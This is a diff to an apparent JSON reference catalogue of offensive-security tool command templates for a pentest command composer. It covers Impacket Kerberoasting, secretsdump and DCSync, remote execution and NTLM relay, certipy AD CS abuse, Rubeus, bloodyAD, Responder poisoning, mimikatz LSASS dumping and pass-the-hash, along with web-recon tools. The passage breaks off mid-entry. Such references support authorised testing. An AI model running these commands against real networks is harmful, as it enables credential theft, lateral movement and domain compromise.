@@ -22,7 +22,23 @@
     "<hash-mode>": "Numeric hash type/mode (hashcat -m).",
     "<base-dn>": "LDAP base DN, e.g. DC=corp,DC=local.",
     "<project>": "Local analysis project name.",
-    "<pattern>": "A literal string or regex to search for."
+    "<pattern>": "A literal string or regex to search for.",
+    "<listener>": "The ATTACKER-side callback address. Deliberately not named <lhost>/<ip>: those spell a keyword the composer's target substitution rewrites, and the callback host is yours, not the target's.",
+    "<listener-port>": "The attacker-side callback port.",
+    "<ntlm-hash>": "An NTLM hash for pass-the-hash, LM:NT or bare NT.",
+    "<interface>": "Local network interface name.",
+    "<param>": "A single request parameter name.",
+    "<token>": "A JWT / session token.",
+    "<group>": "An AD group name.",
+    "<ca>": "AD CS certificate authority name.",
+    "<template-name>": "AD CS certificate template name.",
+    "<cert>": "Path to a certificate / .pfx file.",
+    "<keyfile>": "Path to a private key file.",
+    "<query>": "A search term for a module/exploit/index lookup.",
+    "<payload>": "A payload name (e.g. a msfvenom/metasploit payload path).",
+    "<module>": "A framework module path.",
+    "<api-key>": "API key for a third-party service.",
+    "<spn-user>": "A SECOND account name, distinct from <user> — the account being acted ON when <user> is the account acting."
   },
   "tools": [
     {
@@ -1512,6 +1528,1335 @@
           "flag": "-t",
           "what": "print the file offset"
         }
+      ]
+    },
+    {
+      "name": "GetUserSPNs.py",
+      "aliases": ["impacket-GetUserSPNs", "GetUserSPNs"],
+      "category": "network-ad",
+      "purpose": "Impacket's Kerberoasting script — lists domain accounts that have an SPN and requests a TGS for each, whose encrypted portion is crackable offline as the service account's password.",
+      "phases": ["enumeration", "exploitation", "privesc"],
+      "techniques": ["kerberoasting", "SPN enumeration", "offline credential cracking"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Kerberoast — request a TGS for every SPN account",
+          "template": "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputfile <output>",
+          "note": "Needs any valid domain credential. Feed <output> to hashcat -m 13100."
+        },
+        {
+          "label": "List SPN accounts without requesting tickets",
+          "template": "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip>",
+          "note": "Quieter first look — see which accounts are roastable before pulling tickets."
+        },
+        {
+          "label": "Roast with a hash instead of a password",
+          "template": "GetUserSPNs.py <domain>/<user> -hashes <ntlm-hash> -dc-ip <dc-ip> -request",
+          "note": "Pass-the-hash path when you have the NT hash but not the plaintext."
+        }
+      ],
+      "flags": [
+        {"flag": "-request", "what": "actually request the TGS tickets"},
+        {"flag": "-dc-ip", "what": "domain controller to talk to"},
+        {"flag": "-outputfile", "what": "write hashes to a file"},
+        {"flag": "-hashes", "what": "authenticate with LM:NT instead of a password"},
+        {"flag": "-request-user", "what": "target one account only"}
+      ]
+    },
+    {
+      "name": "GetNPUsers.py",
+      "aliases": ["impacket-GetNPUsers", "GetNPUsers"],
+      "category": "network-ad",
+      "purpose": "Impacket's AS-REP roasting script — finds accounts with Kerberos pre-authentication disabled and pulls an AS-REP whose encrypted blob cracks offline. The one Kerberos attack that needs no credentials at all.",
+      "phases": ["enumeration", "exploitation"],
+      "techniques": ["AS-REP roasting", "pre-auth disabled accounts", "unauthenticated credential access"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "AS-REP roast a username list (no credentials needed)",
+          "template": "GetNPUsers.py <domain>/ -dc-ip <dc-ip> -usersfile <userlist> -no-pass -format hashcat -outputfile <output>",
+          "note": "The trailing slash after the domain is required. Crack with hashcat -m 18200."
+        },
+        {
+          "label": "Enumerate roastable accounts with valid credentials",
+          "template": "GetNPUsers.py <domain>/<user>:<password> -dc-ip <dc-ip> -request -format hashcat -outputfile <output>",
+          "note": "Authenticated: asks the DC directly which accounts have DONT_REQ_PREAUTH."
+        }
+      ],
+      "flags": [
+        {"flag": "-usersfile", "what": "username list to try"},
+        {"flag": "-no-pass", "what": "do not prompt for a password"},
+        {"flag": "-format", "what": "hashcat or john output format"},
+        {"flag": "-request", "what": "request the AS-REP, not just enumerate"}
+      ]
+    },
+    {
+      "name": "secretsdump.py",
+      "aliases": ["impacket-secretsdump", "secretsdump"],
+      "category": "network-ad",
+      "purpose": "Impacket's credential dumper — pulls SAM/LSA secrets and cached logons from a host, or replicates the whole domain's hashes from a DC via DCSync.",
+      "phases": ["exploitation", "privesc", "post-exploitation"],
+      "techniques": ["SAM/LSA dumping", "DCSync", "pass-the-hash material", "cached credential recovery"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Dump local SAM, LSA secrets and cached logons",
+          "template": "secretsdump.py <domain>/<user>:<password>@<target>",
+          "note": "Needs local admin on the host. The single highest-yield post-compromise step."
+        },
+        {
+          "label": "DCSync every NTLM hash in the domain",
+          "template": "secretsdump.py <domain>/<user>:<password>@<dc-ip> -just-dc-ntlm -outputfile <output>",
+          "note": "Requires replication rights (DA, or DS-Replication-Get-Changes*). Very loud."
+        },
+        {
+          "label": "Pass-the-hash instead of a password",
+          "template": "secretsdump.py <domain>/<user>@<target> -hashes <ntlm-hash>",
+          "note": "Reuses a hash recovered from another host — no plaintext required."
+        },
+        {
+          "label": "DCSync a single account",
+          "template": "secretsdump.py <domain>/<user>:<password>@<dc-ip> -just-dc-user krbtgt",
+          "note": "Far quieter than a full dump when you only need one account."
+        }
+      ],
+      "flags": [
+        {"flag": "-just-dc-ntlm", "what": "DCSync, NTLM hashes only"},
+        {"flag": "-just-dc-user", "what": "DCSync one named account"},
+        {"flag": "-hashes", "what": "authenticate with LM:NT"},
+        {"flag": "-outputfile", "what": "write the dump to a file"},
+        {"flag": "-sam / -system", "what": "parse offline registry hives instead"}
+      ]
+    },
+    {
+      "name": "psexec.py",
+      "aliases": ["impacket-psexec", "psexec"],
+      "category": "network-ad",
+      "purpose": "Impacket remote execution — uploads a service binary over SMB and runs it, giving a fully interactive SYSTEM shell. The loudest of the three exec methods and the most likely to be caught.",
+      "phases": ["exploitation", "post-exploitation"],
+      "techniques": ["SMB remote execution", "service creation", "lateral movement"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Interactive SYSTEM shell",
+          "template": "psexec.py <domain>/<user>:<password>@<target>",
+          "note": "Needs local admin + ADMIN$ writable. Creates and deletes a service — noisy."
+        },
+        {
+          "label": "Pass-the-hash",
+          "template": "psexec.py <domain>/<user>@<target> -hashes <ntlm-hash>",
+          "note": "Same access without the plaintext password."
+        },
+        {
+          "label": "Run one command and exit",
+          "template": "psexec.py <domain>/<user>:<password>@<target> '<pattern>'",
+          "note": "Single command instead of a shell; <pattern> is the command line to run."
+        }
+      ],
+      "flags": [
+        {"flag": "-hashes", "what": "authenticate with LM:NT"},
+        {"flag": "-service-name", "what": "name the created service (default is random)"},
+        {"flag": "-k", "what": "use Kerberos auth from the ccache"}
+      ]
+    },
+    {
+      "name": "wmiexec.py",
+      "aliases": ["impacket-wmiexec", "wmiexec"],
+      "category": "network-ad",
+      "purpose": "Impacket remote execution over WMI — semi-interactive, and notably quieter than psexec because it creates no service and drops no binary.",
+      "phases": ["exploitation", "post-exploitation"],
+      "techniques": ["WMI remote execution", "lateral movement", "fileless execution"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Semi-interactive shell over WMI",
+          "template": "wmiexec.py <domain>/<user>:<password>@<target>",
+          "note": "Preferred over psexec when you want less noise; each command is a new process."
+        },
+        {
+          "label": "Pass-the-hash",
+          "template": "wmiexec.py <domain>/<user>@<target> -hashes <ntlm-hash>",
+          "note": "Hash-only authentication."
+        },
+        {
+          "label": "Run a single command",
+          "template": "wmiexec.py <domain>/<user>:<password>@<target> '<pattern>'",
+          "note": "One-shot execution; <pattern> is the command line."
+        }
+      ],
+      "flags": [
+        {"flag": "-hashes", "what": "authenticate with LM:NT"},
+        {"flag": "-nooutput", "what": "do not retrieve output (no SMB share needed)"},
+        {"flag": "-k", "what": "Kerberos auth from the ccache"}
+      ]
+    },
+    {
+      "name": "smbexec.py",
+      "aliases": ["impacket-smbexec", "smbexec"],
+      "category": "network-ad",
+      "purpose": "Impacket remote execution over SMB using a temporary service that writes output to a share — no binary upload, so it evades some AV that catches psexec.",
+      "phases": ["exploitation", "post-exploitation"],
+      "techniques": ["SMB remote execution", "lateral movement"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Semi-interactive shell over SMB",
+          "template": "smbexec.py <domain>/<user>:<password>@<target>",
+          "note": "Third exec option when psexec and wmiexec are blocked."
+        },
+        {
+          "label": "Pass-the-hash",
+          "template": "smbexec.py <domain>/<user>@<target> -hashes <ntlm-hash>",
+          "note": "Hash-only authentication."
+        }
+      ],
+      "flags": [
+        {"flag": "-hashes", "what": "authenticate with LM:NT"},
+        {"flag": "-share", "what": "share used to read command output"},
+        {"flag": "-mode", "what": "SHARE or SERVER output mode"}
+      ]
+    },
+    {
+      "name": "ntlmrelayx.py",
+      "aliases": ["impacket-ntlmrelayx", "ntlmrelayx"],
+      "category": "network-ad",
+      "purpose": "Impacket's NTLM relay — takes an authentication coerced or poisoned out of a victim and replays it to another service, turning a captured hash you cannot crack into live authenticated access.",
+      "phases": ["exploitation", "privesc"],
+      "techniques": ["NTLM relay", "SMB signing abuse", "LDAP relay", "AD CS ESC8 relay"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Relay to a list of SMB targets",
+          "template": "ntlmrelayx.py -tf <file> -smb2support -of <output>",
+          "note": "Only works against hosts with SMB signing NOT required — enumerate that first."
+        },
+        {
+          "label": "Relay to LDAP and dump the domain",
+          "template": "ntlmrelayx.py -t ldaps://<dc-ip> --dump-laps --dump-gmsa",
+          "note": "LDAPS avoids the channel-binding rejection plain LDAP usually gives."
+        },
+        {
+          "label": "Relay to AD CS web enrollment (ESC8)",
+          "template": "ntlmrelayx.py -t http://<dc-ip>/certsrv/certfnsh.asp -smb2support --adcs --template <template-name>",
+          "note": "Yields a certificate for the relayed account — authenticate with it via certipy."
+        },
+        {
+          "label": "Relay and escalate an account over LDAP",
+          "template": "ntlmrelayx.py -t ldaps://<dc-ip> --escalate-user <user>",
+          "note": "Grants <user> DCSync rights when the relayed identity can write the domain ACL."
+        }
+      ],
+      "flags": [
+        {"flag": "-tf", "what": "file of relay targets"},
+        {"flag": "-smb2support", "what": "accept SMB2 clients"},
+        {"flag": "--adcs", "what": "relay to AD CS web enrollment"},
+        {"flag": "--escalate-user", "what": "grant the named user DCSync rights"},
+        {"flag": "-socks", "what": "keep sessions open behind a SOCKS proxy"}
+      ]
+    },
+    {
+      "name": "mssqlclient.py",
+      "aliases": ["impacket-mssqlclient", "mssqlclient"],
+      "category": "network-ad",
+      "purpose": "Impacket MSSQL client — authenticates to SQL Server with domain or SQL credentials and gives a query shell, xp_cmdshell execution and link enumeration.",
+      "phases": ["enumeration", "exploitation", "privesc"],
+      "techniques": ["MSSQL authentication", "xp_cmdshell execution", "database link abuse", "impersonation"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Connect with Windows authentication",
+          "template": "mssqlclient.py <domain>/<user>:<password>@<target> -windows-auth",
+          "note": "-windows-auth is the domain path; omit it for a SQL-native login."
+        },
+        {
+          "label": "Connect with a hash",
+          "template": "mssqlclient.py <domain>/<user>@<target> -hashes <ntlm-hash> -windows-auth",
+          "note": "Pass-the-hash into SQL Server."
+        },
+        {
+          "label": "Enable and use xp_cmdshell (once connected)",
+          "template": "enable_xp_cmdshell",
+          "note": "Then `xp_cmdshell whoami`. Requires sysadmin; this is command execution on the host."
+        },
+        {
+          "label": "Enumerate linked servers (once connected)",
+          "template": "enum_links",
+          "note": "Linked servers often chain into another instance with higher privileges."
+        }
+      ],
+      "flags": [
+        {"flag": "-windows-auth", "what": "use Windows/domain authentication"},
+        {"flag": "-hashes", "what": "authenticate with LM:NT"},
+        {"flag": "-db", "what": "database to connect to"}
+      ]
+    },
+    {
+      "name": "getTGT.py",
+      "aliases": ["impacket-getTGT", "getTGT"],
+      "category": "network-ad",
+      "purpose": "Impacket ticket requester — exchanges a password, NT hash or AES key for a Kerberos TGT written to a ccache, which every other Kerberos-aware tool can then reuse.",
+      "phases": ["exploitation", "privesc"],
+      "techniques": ["Kerberos TGT request", "pass-the-key", "overpass-the-hash"],
+      "docs": "https://github.com/fortra/impacket",
+      "templates": [
+        {
+          "label": "Request a TGT with a password",
+          "template": "getTGT.py <domain>/<user>:<password> -dc-ip <dc-ip>",
+          "note": "Writes <user>.ccache; then `export KRB5CCNAME=<user>.ccache` and use -k elsewhere."
+        },
+        {
+          "label": "Overpass-the-hash — TGT from an NT hash",
+          "template": "getTGT.py <domain>/<user> -hashes <ntlm-hash> -dc-ip <dc-ip>",
+          "note": "Turns a hash you cannot crack into a usable Kerberos ticket."
+        }
+      ],
+      "flags": [
+        {"flag": "-hashes", "what": "LM:NT instead of a password"},
+        {"flag": "-aesKey", "what": "AES key instead of a password"},
+        {"flag": "-dc-ip", "what": "domain controller to ask"}
+      ]
+    },
+    {
+      "name": "certipy",
+      "aliases": ["certipy-ad"],
+      "category": "network-ad",
+      "purpose": "AD Certificate Services attack tool — enumerates certificate templates, flags the misconfigurations (ESC1-ESC11) that let a low-privileged user enrol as anyone, requests the certificate and authenticates with it.",
+      "phases": ["enumeration", "privesc", "exploitation"],
+      "techniques": ["AD CS enumeration", "ESC1 template abuse", "certificate-based authentication", "shadow credentials"],
+      "docs": "https://github.com/ly4k/Certipy",
+      "templates": [
+        {
+          "label": "Find vulnerable certificate templates",
+          "template": "certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip> -vulnerable -stdout",
+          "note": "Start here — -vulnerable filters to templates with a real escalation path."
+        },
+        {
+          "label": "Request a certificate as another user (ESC1)",
+          "template": "certipy req -u <user>@<domain> -p <password> -target <target> -ca <ca> -template <template-name> -upn administrator@<domain>",
+          "note": "Works when the template allows a requester-supplied SAN and client authentication."
+        },
+        {
+          "label": "Authenticate with the certificate for a TGT and NT hash",
+          "template": "certipy auth -pfx <cert> -dc-ip <dc-ip>",
+          "note": "Turns the .pfx into a Kerberos TGT and the account's NT hash."
+        },
+        {
+          "label": "Shadow credentials — add a key credential to an account",
+          "template": "certipy shadow auto -u <user>@<domain> -p <password> -account <spn-user> -dc-ip <dc-ip>",
+          "note": "Needs write access to the target account's msDS-KeyCredentialLink."
+        }
+      ],
+      "flags": [
+        {"flag": "-vulnerable", "what": "only show templates with an escalation path"},
+        {"flag": "-stdout", "what": "print instead of writing files"},
+        {"flag": "-upn", "what": "the identity to request the certificate as"},
+        {"flag": "-ca", "what": "certificate authority name"},
+        {"flag": "-template", "what": "certificate template name"}
+      ]
+    },
+    {
+      "name": "evil-winrm",
+      "category": "network-ad",
+      "purpose": "WinRM shell client — the standard way to use recovered Windows credentials interactively once the account is in Remote Management Users.",
+      "phases": ["exploitation", "post-exploitation"],
+      "techniques": ["WinRM authentication", "lateral movement", "pass-the-hash shell"],
+      "docs": "https://github.com/Hackplayers/evil-winrm",
+      "templates": [
+        {
+          "label": "Shell with a password",
+          "template": "evil-winrm -i <target> -u <user> -p <password>",
+          "note": "Port 5985. Check the account is in Remote Management Users first."
+        },
+        {
+          "label": "Pass-the-hash shell",
+          "template": "evil-winrm -i <target> -u <user> -H <ntlm-hash>",
+          "note": "NT hash only — no plaintext needed."
+        },
+        {
+          "label": "With upload/download directories",
+          "template": "evil-winrm -i <target> -u <user> -p <password> -s <output> -e <output>",
+          "note": "-s scripts dir, -e executables dir; enables the built-in in-memory loaders."
+        },
+        {
+          "label": "Certificate authentication over HTTPS (5986)",
+          "template": "evil-winrm -i <target> -c <cert> -k <keyfile> -S",
+          "note": "-S switches to SSL; used when password auth is disabled."
+        }
+      ],
+      "flags": [
+        {"flag": "-i", "what": "target host"},
+        {"flag": "-H", "what": "NT hash instead of a password"},
+        {"flag": "-S", "what": "use SSL (port 5986)"},
+        {"flag": "-s / -e", "what": "local scripts / executables directory"}
+      ]
+    },
+    {
+      "name": "rubeus",
+      "aliases": ["Rubeus.exe"],
+      "category": "network-ad",
+      "purpose": "On-host Kerberos toolkit for Windows — roasting, ticket harvesting, pass-the-ticket and delegation abuse from inside a session, where Impacket's network-side equivalents cannot reach.",
+      "phases": ["enumeration", "privesc", "post-exploitation"],
+      "techniques": ["kerberoasting", "AS-REP roasting", "pass-the-ticket", "delegation abuse", "ticket harvesting"],
+      "docs": "https://github.com/GhostPack/Rubeus",
+      "templates": [
+        {
+          "label": "Kerberoast from inside the domain",
+          "template": "Rubeus.exe kerberoast /format:hashcat /outfile:<output>",
+          "note": "Runs in the current user's context — no credentials to supply."
+        },
+        {
+          "label": "AS-REP roast",
+          "template": "Rubeus.exe asreproast /format:hashcat /outfile:<output>",
+          "note": "Finds pre-auth-disabled accounts from the session's own context."
+        },
+        {
+          "label": "Harvest TGTs from memory",
+          "template": "Rubeus.exe harvest /interval:30",
+          "note": "Needs elevation. Collects tickets as other users authenticate."
+        },
+        {
+          "label": "Pass-the-ticket",
+          "template": "Rubeus.exe ptt /ticket:<file>",
+          "note": "Injects a base64 or .kirbi ticket into the current logon session."
+        }
+      ],
+      "flags": [
+        {"flag": "/format:hashcat", "what": "hashcat-ready output"},
+        {"flag": "/outfile:", "what": "write hashes to a file"},
+        {"flag": "/nowrap", "what": "unwrapped base64 (easier to copy)"},
+        {"flag": "/ticket:", "what": "ticket to inject or use"}
+      ]
+    },
+    {
+      "name": "ldapdomaindump",
+      "category": "network-ad",
+      "purpose": "Dumps the whole directory — users, groups, computers, policies — over LDAP into HTML, JSON and greppable text with one authenticated bind. The fastest way to get an offline copy of the domain.",
+      "phases": ["enumeration"],
+      "techniques": ["LDAP enumeration", "domain user/group dumping", "offline directory analysis"],
+      "docs": "https://github.com/dirkjanm/ldapdomaindump",
+      "templates": [
+        {
+          "label": "Dump the domain to HTML/JSON/greppable",
+          "template": "ldapdomaindump -u '<domain>\\<user>' -p <password> -o <output> ldap://<dc-ip>",
+          "note": "Any valid domain account is enough. Read domain_users.html first."
+        },
+        {
+          "label": "Dump over LDAPS",
+          "template": "ldapdomaindump -u '<domain>\\<user>' -p <password> -o <output> ldaps://<dc-ip>",
+          "note": "Use when plain LDAP binds are refused by channel binding / signing policy."
+        },
+        {
+          "label": "Resolve computer names to addresses",
+          "template": "ldapdomaindump -u '<domain>\\<user>' -p <password> -r -o <output> ldap://<dc-ip>",
+          "note": "-r adds DNS resolution — useful for building a host list to scan."
+        }
+      ],
+      "flags": [
+        {"flag": "-u", "what": "DOMAIN\\\\user"},
+        {"flag": "-o", "what": "output directory"},
+        {"flag": "-r", "what": "resolve computer hostnames"},
+        {"flag": "--no-json / --no-grep", "what": "limit the output formats"}
+      ]
+    },
+    {
+      "name": "bloodyAD",
+      "category": "network-ad",
+      "purpose": "AD privilege-escalation swiss army knife — reads and, crucially, WRITES directory objects, so a BloodHound-discovered ACL edge (GenericAll, WriteDACL, AddMember) can actually be exercised.",
+      "phases": ["enumeration", "privesc", "exploitation"],
+      "techniques": ["ACL abuse", "group membership manipulation", "password reset", "RBCD", "shadow credentials"],
+      "docs": "https://github.com/CravateRouge/bloodyAD",
+      "templates": [
+        {
+          "label": "Read an object's attributes",
+          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> get object <spn-user>",
+          "note": "Confirms the edge BloodHound claimed before you try to use it."
+        },
+        {
+          "label": "Add yourself to a group (AddMember / GenericAll)",
+          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> add groupMember <group> <user>",
+          "note": "The most common way to cash in a BloodHound path. Reversible — remove it after."
+        },
+        {
+          "label": "Reset another account's password (ForceChangePassword)",
+          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> set password <spn-user> <password>",
+          "note": "Destructive to the account's real password — get authorisation before using it."
+        },
+        {
+          "label": "Add a shadow credential (GenericWrite on the target)",
+          "template": "bloodyAD -u <user> -p <password> -d <domain> --host <dc-ip> add shadowCredentials <spn-user>",
+          "note": "Non-destructive alternative to a password reset — yields a certificate instead."
+        }
+      ],
+      "flags": [
+        {"flag": "--host", "what": "domain controller"},
+        {"flag": "-k", "what": "Kerberos authentication"},
+        {"flag": "add / set / get / remove", "what": "the operation verb"}
+      ]
+    },
+    {
+      "name": "powerview",
+      "aliases": ["PowerView.ps1"],
+      "category": "network-ad",
+      "purpose": "PowerShell domain-enumeration library — the on-host counterpart to BloodHound's collection, letting you ask targeted directory questions from an existing session without dropping a collector.",
+      "phases": ["enumeration", "privesc"],
+      "techniques": ["domain enumeration", "ACL hunting", "local admin access discovery", "SPN discovery"],
+      "docs": "https://powersploit.readthedocs.io/en/latest/Recon/",
+      "templates": [
+        {
+          "label": "Load PowerView into the session",
+          "template": ". .\\PowerView.ps1",
+          "note": "Dot-sourced so the functions land in the current scope."
+        },
+        {
+          "label": "Find hosts where the current user is local admin",
+          "template": "Find-LocalAdminAccess",
+          "note": "Directly answers 'where can I move next' — often the fastest pivot."
+        },
+        {
+          "label": "List kerberoastable accounts",
+          "template": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname",
+          "note": "Same targets Rubeus/GetUserSPNs would roast, without touching Kerberos yet."
+        },
+        {
+          "label": "Hunt interesting ACLs",
+          "template": "Find-InterestingDomainAcl -ResolveGUIDs",
+          "note": "Surfaces the writeable-object edges that BloodHound draws as escalation paths."
+        }
+      ],
+      "flags": [
+        {"flag": "-Identity", "what": "restrict to one object"},
+        {"flag": "-Domain", "what": "query a different domain"},
+        {"flag": "-ResolveGUIDs", "what": "translate extended-right GUIDs to names"}
+      ]
+    },
+    {
+      "name": "responder",
+      "aliases": ["Responder.py"],
+      "category": "credentials",
+      "purpose": "LLMNR/NBT-NS/mDNS poisoner — answers the broadcast name lookups Windows makes when DNS fails, so victims authenticate to you and hand over NetNTLM hashes. The classic no-credential foothold on an internal network.",
+      "phases": ["enumeration", "exploitation"],
+      "techniques": ["LLMNR/NBT-NS poisoning", "NetNTLM hash capture", "relay staging"],
+      "docs": "https://github.com/lgandx/Responder",
+      "templates": [
+        {
+          "label": "Poison and capture hashes",
+          "template": "responder -I <interface> -wd",
+          "note": "Hashes land in /usr/share/responder/logs. Crack with hashcat -m 5600."
+        },
+        {
+          "label": "Analyse only — listen, poison nothing",
+          "template": "responder -I <interface> -A",
+          "note": "Passive reconnaissance of what name traffic exists before you interfere with it."
+        },
+        {
+          "label": "Disable SMB/HTTP servers for relaying",
+          "template": "responder -I <interface> -wd --lm",
+          "note": "Turn SMB and HTTP off in Responder.conf when ntlmrelayx needs those ports."
+        }
+      ],
+      "flags": [
+        {"flag": "-I", "what": "interface to listen on"},
+        {"flag": "-A", "what": "analyse mode — no poisoning"},
+        {"flag": "-w", "what": "WPAD rogue proxy server"},
+        {"flag": "-d", "what": "answer NetBIOS domain suffix queries"}
+      ]
+    },
+    {
+      "name": "mimikatz",
+      "aliases": ["mimikatz.exe"],
+      "category": "credentials",
+      "purpose": "Windows credential extraction — reads plaintext passwords, hashes and Kerberos tickets out of LSASS memory, and performs DCSync from an elevated session.",
+      "phases": ["privesc", "post-exploitation"],
+      "techniques": ["LSASS credential dumping", "pass-the-hash", "pass-the-ticket", "DCSync", "golden ticket"],
+      "docs": "https://github.com/gentilkiwi/mimikatz/wiki",
+      "templates": [
+        {
+          "label": "Dump logon credentials from LSASS",
+          "template": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+          "note": "Needs SeDebugPrivilege (local admin). Caught by essentially every modern EDR."
+        },
+        {
+          "label": "DCSync one account",
+          "template": "mimikatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" exit",
+          "note": "Requires replication rights. The krbtgt hash is what a golden ticket needs."
+        },
+        {
+          "label": "Pass-the-hash into a new process",
+          "template": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm-hash> /run:cmd.exe",
+          "note": "Spawns a process authenticating as that account, without the plaintext."
+        },
+        {
+          "label": "List cached Kerberos tickets",
+          "template": "kerberos::list /export",
+          "note": "Exports .kirbi tickets for reuse via pass-the-ticket."
+        }
+      ],
+      "flags": [
+        {"flag": "privilege::debug", "what": "acquire SeDebugPrivilege first"},
+        {"flag": "sekurlsa::", "what": "LSASS memory module"},
+        {"flag": "lsadump::", "what": "SAM/LSA/DCSync module"},
+        {"flag": "/ntlm:", "what": "hash to authenticate with"}
+      ]
+    },
+    {
+      "name": "arjun",
+      "category": "web",
+      "purpose": "HTTP parameter discovery — finds query and body parameters an endpoint accepts but never advertises, which is where IDOR, SSRF and mass-assignment bugs usually hide.",
+      "phases": ["enumeration", "exploitation"],
+      "techniques": ["hidden parameter discovery", "parameter mining", "attack surface expansion"],
+      "docs": "https://github.com/s0md3v/Arjun",
+      "templates": [
+        {
+          "label": "Discover GET parameters",
+          "template": "arjun -u <url> -oT <output>",
+          "note": "Baselines the response first, then bisects a parameter wordlist against it."
+        },
+        {
+          "label": "Discover POST / JSON body parameters",
+          "template": "arjun -u <url> -m POST -oT <output>",
+          "note": "-m JSON when the endpoint expects a JSON body."
+        },
+        {
+          "label": "Mine a whole list of endpoints",
+          "template": "arjun -i <file> -oJ <output>",
+          "note": "Feed it the URL list katana/gau produced."
+        },
+        {
+          "label": "Rate-limited run against a fragile target",
+          "template": "arjun -u <url> --stable -d <size>",
+          "note": "--stable slows down and re-checks; -d is a delay in seconds between requests."
+        }
+      ],
+      "flags": [
+        {"flag": "-m", "what": "method: GET, POST, JSON, XML"},
+        {"flag": "-w", "what": "custom parameter wordlist"},
+        {"flag": "-oT / -oJ", "what": "text / JSON output"},
+        {"flag": "--stable", "what": "slower, higher-confidence mode"}
+      ]
+    },
+    {
+      "name": "paramspider",
+      "category": "web",
+      "purpose": "Mines web archives for URLs that carry parameters, giving a parameterised attack surface for a domain without sending the target a single request.",
+      "phases": ["recon", "enumeration"],
+      "techniques": ["passive parameter discovery", "archive mining", "URL harvesting"],
+      "docs": "https://github.com/devanshbatham/ParamSpider",
+      "templates": [
+        {
+          "label": "Mine archived parameterised URLs",
+          "template": "paramspider -d <domain>",
+          "note": "Passive — it queries archives, not the target."
+        },
+        {
+          "label": "Drop static assets from the results",
+          "template": "paramspider -d <domain> --exclude woff,css,js,png,svg,jpg,gif -o <output>",
+          "note": "Static files dominate archive data; excluding them leaves the real endpoints."
+        },
+        {
+          "label": "Placeholder-marked output for fuzzing",
+          "template": "paramspider -d <domain> -p FUZZ -o <output>",
+          "note": "Values replaced with FUZZ so the list drops straight into ffuf or wfuzz."
+        }
+      ],
+      "flags": [
+        {"flag": "-d", "what": "domain to mine"},
+        {"flag": "--exclude", "what": "extensions to drop"},
+        {"flag": "-p", "what": "placeholder to substitute for parameter values"},
+        {"flag": "-s", "what": "also fetch subdomain results"}
+      ]
+    },
+    {
+      "name": "katana",
+      "category": "web",
+      "purpose": "Fast crawler with an optional headless browser, so it sees the endpoints a JavaScript-rendered application only exposes at runtime.",
+      "phases": ["recon", "enumeration"],
+      "techniques": ["web crawling", "JS endpoint extraction", "headless rendering", "sitemap discovery"],
+      "docs": "https://github.com/projectdiscovery/katana",
+      "templates": [
+        {
+          "label": "Crawl a target",
+          "template": "katana -u <url> -d 3 -jc -o <output>",
+          "note": "-jc parses linked JavaScript for endpoints the HTML never references."
+        },
+        {
+          "label": "Headless crawl for a JS-heavy app",
+          "template": "katana -u <url> -headless -jc -kf all -o <output>",
+          "note": "Slower but finds routes that only exist after the bundle executes."
+        },
+        {
+          "label": "Crawl a host list, staying in scope",
+          "template": "katana -list <file> -fs fqdn -o <output>",
+          "note": "-fs fqdn keeps the crawl on the same host instead of wandering off-scope."
+        },
+        {
+          "label": "Passive sources only (no requests to the target)",
+          "template": "katana -u <url> -ps -o <output>",
+          "note": "Pulls from archives/indexes — useful before you are cleared to touch the host."
+        }
+      ],
+      "flags": [
+        {"flag": "-d", "what": "crawl depth"},
+        {"flag": "-jc", "what": "parse JavaScript for endpoints"},
+        {"flag": "-headless", "what": "render with a real browser"},
+        {"flag": "-fs", "what": "field scope: dn, rdn, fqdn"},
+        {"flag": "-ps", "what": "passive sources only"}
+      ]
+    },
+    {
+      "name": "gau",
+      "aliases": ["getallurls"],
+      "category": "web",
+      "purpose": "Pulls every URL known to Wayback, Common Crawl, OTX and URLScan for a domain — historical endpoints that are often still live and rarely still maintained.",
+      "phases": ["recon", "enumeration"],
+      "techniques": ["archive URL harvesting", "historical endpoint discovery", "passive recon"],
+      "docs": "https://github.com/lc/gau",
+      "templates": [
+        {
+          "label": "All known URLs for a domain",
+          "template": "gau <domain> | tee <output>",
+          "note": "Entirely passive — no traffic reaches the target."
+        },
+        {
+          "label": "Include subdomains, recent results only",
+          "template": "gau --subs --from 202301 <domain> | tee <output>",
+          "note": "--from trims a decade of dead paths down to plausibly-live ones."
+        },
+        {
+          "label": "Keep only parameterised URLs",
+          "template": "gau <domain> | grep '?' | sort -u > <output>",
+          "note": "The subset worth fuzzing — everything else is static."
+        }
+      ],
+      "flags": [
+        {"flag": "--subs", "what": "include subdomains"},
+        {"flag": "--from / --to", "what": "date range, YYYYMM"},
+        {"flag": "--blacklist", "what": "extensions to drop"},
+        {"flag": "--threads", "what": "concurrency"}
+      ]
+    },
+    {
+      "name": "waybackurls",
+      "category": "web",
+      "purpose": "Fetches every path the Wayback Machine ever recorded for a domain. Narrower than gau, and the standard first passive sweep for forgotten endpoints and old parameters.",
+      "phases": ["recon"],
+      "techniques": ["archive URL harvesting", "passive recon", "forgotten endpoint discovery"],
+      "docs": "https://github.com/tomnomnom/waybackurls",
+      "templates": [
+        {
+          "label": "Archived URLs for a domain",
+          "template": "waybackurls <domain> | tee <output>",
+          "note": "Passive. Reads stdin too, so it chains after subfinder."
+        },
+        {
